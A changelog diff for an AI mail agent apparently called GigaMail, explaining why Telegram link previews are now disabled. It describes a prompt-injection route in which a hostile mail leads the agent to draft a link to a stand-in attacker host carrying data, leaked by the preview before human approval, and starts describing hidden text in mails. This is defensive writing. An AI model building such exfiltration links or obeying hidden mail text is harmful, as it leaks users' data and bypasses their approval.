@@ -2,6 +2,14 @@
 
 ## Unreleased
 
+- **Telegram messages have no link preview.** Telegram fetches the first
+  link of a message from its own servers to preview it, as soon as the
+  message is sent. A draft written by an agent that read a hostile mail
+  could carry a link with data in it (`https://attacker.example/?d=...`),
+  and the data left the moment the draft reached the phone for approval,
+  approved or not. Every text GigaMail sends to Telegram now disables the
+  preview, and the custom notify-command example in `policy.py` does too.
+
 - **The agent reads what the person sees, and nothing hidden.** A mail
   can carry text the reader never sees (display:none, font size zero,
   white on white, off-screen blocks, zero-width or Unicode tag
